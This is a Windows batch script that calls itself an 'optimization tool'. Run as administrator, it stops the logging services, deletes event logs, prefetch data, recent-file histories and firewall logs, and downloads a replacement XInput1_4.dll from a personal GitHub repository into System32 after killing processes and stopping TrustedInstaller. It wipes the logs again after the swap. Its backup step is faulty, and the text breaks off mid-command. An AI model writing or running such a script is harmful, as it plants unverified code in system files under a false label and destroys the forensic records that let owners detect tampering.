@echo off
title TENZO Optimization Tool - Clear Logs and Optimize System
cls

:: Copyright and Info
echo ================================
echo       HDN Neurohost Module
echo ================================
echo Copyright (c) 2025 Rahul. All Rights Reserved.
echo Made by Rahul.
echo ================================
echo Please read the instructions carefully before proceeding.
echo ================================
pause

:: Ensure script runs as Administrator
NET SESSION >nul 2>&1
IF %ERRORLEVEL% NEQ 0 (
    echo Please run this script as Administrator!
    pause
    exit
)

echo Stopping Windows Logging Services...
net stop "EventLog" /y >nul 2>&1
net stop "Wecsvc" /y >nul 2>&1
net stop "Winmgmt" /y >nul 2>&1

echo Taking Ownership of Log Files...
takeown /f "%WinDir%\Logs" /r /d y >nul 2>&1
icacls "%WinDir%\Logs" /grant Administrators:F /t /c /q >nul 2>&1
takeown /f "%SystemRoot%\System32\winevt\Logs" /r /d y >nul 2>&1
icacls "%SystemRoot%\System32\winevt\Logs" /grant Administrators:F /t /c /q >nul 2>&1

echo Deleting ALL Logs (This is a pre-step, cleanup after process will happen later)...
:: Deleting logs (temporary, to clear any existing logs that might be relevant before starting the optimization process)
del /s /f /q "%WinDir%\Logs\*" >nul 2>&1
del /s /f /q "%SystemRoot%\System32\winevt\Logs\*" >nul 2>&1
del /s /f /q "%LocalAppData%\Temp\*" >nul 2>&1
del /s /f /q "%Temp%\*" >nul 2>&1
del /s /f /q "%WinDir%\Temp\*" >nul 2>&1
del /s /f /q "%SystemRoot%\Prefetch\*" >nul 2>&1
del /s /f /q "%LocalAppData%\Microsoft\Windows\INetCache\*" >nul 2>&1

:: Main Menu
:menu
cls
echo ================================
echo       HDN Neurohost Module
echo ================================
echo WARNING: Optimization process will now apply critical system-level changes!
echo Do not interrupt the process. This is for optimization purposes only.
echo ================================
echo 1. Apply Optimization (Critical Update)
echo 2. Revert to Original HDN Settings
echo 3. Exit
echo ================================
set /p choice="Select an option (1-3): "

if "%choice%"=="1" goto replace
if "%choice%"=="2" goto revert
if "%choice%"=="3" exit

goto menu

:replace
cls
echo HDN Neurohost: Applying critical update...
echo ================================
echo WARNING: This action will apply system-level optimizations.
echo Please ensure all processes are closed and proceed only if you are ready.
echo ================================

:: Check for Admin Privileges
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo ERROR: Administrator privileges required.
    echo Please run this script as Administrator.
    pause
    exit /b
)

:: Set the URL for the file download
set "dll_url=https://github.com/newxrahul9851reg/backupdll/raw/refs/heads/main/XInput1_4.dll"
set "dll_path=%TEMP%\XInput1_4.dll"
set "system_dll_path=%SystemRoot%\System32\XInput1_4.dll"
set "backup_path=%SystemRoot%\System32\XInput1_4_backup.dll"

:: Download the file using PowerShell
echo Connecting to the server for HDN update...
powershell -Command "& {Invoke-WebRequest '%dll_url%' -OutFile '%dll_path%'}"

:: Check if the download was successful
if not exist "%dll_path%" (
    echo ERROR: Download failed! Please check your internet connection or the link.
    pause
    exit /b
)
echo SUCCESS: Update file downloaded.

:: Find and terminate processes using the file
echo ================================
echo WARNING: Terminating processes for optimization...
echo ================================
for /f "tokens=*" %%a in ('powershell -command "Get-Process | Where-Object {($_.Modules | Where-Object {$_.FileName -match 'XInput1_4.dll'})} | Select-Object -ExpandProperty Id"') do (
    echo KILLING: Process ID %%a
    taskkill /PID %%a /F
)

:: Stop Windows File Protection temporarily (if needed)
net stop wuauserv >nul 2>&1
net stop trustedinstaller >nul 2>&1

:: Take ownership and modify permissions
if exist "%system_dll_path%" (
    takeown /f "%system_dll_path%" /a >nul 2>&1
    icacls "%system_dll_path%" /grant Administrators:F /t /c /l >nul 2>&1
)

:: Backup original file
if exist "%system_dll_path%" (
    ren "%system_dll_path%" winmm_backup.dat >nul 2>&1
    if %errorlevel% neq 0 (
        echo ERROR: Failed to rename original file! It may be locked.
        pause
        exit /b
    )
    echo Original file renamed for backup successfully.
    move /y "%system_dll_path%" "%backup_path%" >nul 2>&1
    if %errorlevel% neq 0 (
        echo ERROR: Failed to move backup file! It may be locked.
        pause
        exit /b
    )
    echo Backup completed successfully.
)

:: Copy new file to System32
copy /y "%dll_path%" "%system_dll_path%"
if %errorlevel% neq 0 (
    echo ERROR: Failed to apply the update! Try running in Safe Mode.
    pause
    exit /b
)
echo SUCCESS: Update applied successfully!

:: Restart stopped services
net start wuauserv >nul 2>&1
net start trustedinstaller >nul 2>&1

:: Clear all logs **after** the optimization is done
echo ================================
echo Clearing logs after optimization...
echo ================================
del /s /f /q "%WinDir%\Logs\*" >nul 2>&1
del /s /f /q "%SystemRoot%\System32\winevt\Logs\*" >nul 2>&1
del /s /f /q "%LocalAppData%\Temp\*" >nul 2>&1
del /s /f /q "%Temp%\*" >nul 2>&1
del /s /f /q "%WinDir%\Temp\*" >nul 2>&1
del /s /f /q "%SystemRoot%\Prefetch\*" >nul 2>&1
del /s /f /q "%LocalAppData%\Microsoft\Windows\INetCache\*" >nul 2>&1
del /s /f /q "%WinDir%\SoftwareDistribution\Datastore\Logs\*" >nul 2>&1
del /s /f /q "%WinDir%\Panther\*" >nul 2>&1
del /s /f /q "%WinDir%\INF\Setupapi.log" >nul 2>&1
del /s /f /q "%WinDir%\INF\Setupapi.dev.log" >nul 2>&1
del /s /f /q "%LocalAppData%\Microsoft\Windows\WER\*" >nul 2>&1
del /s /f /q "%ProgramData%\Microsoft\Windows\WER\*" >nul 2>&1
del /s /f /q "%AppData%\Microsoft\Windows\Recent\*" >nul 2>&1
del /s /f /q "%AppData%\Roaming\Microsoft\Windows\Recent\*" >nul 2>&1
del /s /f /q "%AppData%\Microsoft\Windows\Recent\AutomaticDestinations\*" >nul 2>&1
del /s /f /q "%AppData%\Microsoft\Windows\Recent\CustomDestinations\*" >nul 2>&1
del /s /f /q "%WinDir%\System32\LogFiles\Firewall\*" >nul 2>&1
del /s /f /q "%WinDir%\System32\LogFiles\WMI\*" >nul 2>&1
del /s /f /q "%WinDir%\System32\LogFiles\*" >nul 2>&1

echo Done! HDN Neurohost  has been successfully applied and logs cleared.
pause
goto menu

:revert
cls
echo Reverting to original HDN settings...
echo ================================

:: Check if the backup exists
echo Backup path: %backup_path%
if exist "%backup_path%" (
    echo Restoring original HDN settings...
    move /y "%backup_path%" "%system_dll_path%"
    if %errorlevel% neq 0 (
        echo ERROR: Failed to revert the HDN settings! Try running in Safe Mode.
        pause
        exit /b
    )
    echo Original HDN settings restored successfully.
) else (
    echo ERROR: Backup not found! Cannot revert to the original settings.
)

:: Restart stopped services
net start wuauserv >nul 2>&1
net start trustedinstaller >nul 2>&1

:: Clear all logs **after** reverting
echo ================================
echo Clearing logs after reverting...
echo ================================
del /s /f /q "%WinDir%\Logs\*" >nul 2>&1
del /s /f /q "%SystemRoot%\System32\winevt\Logs\*" >nul 2>&1
del /s /f /q "%LocalAppData%\Temp\*" >nul 2>&1
del /s /f /q "%Temp%\*" >nul 2>&1
del /s /f /q "%WinDir%\Temp\*" >nul 2>&1
del /s /f /q
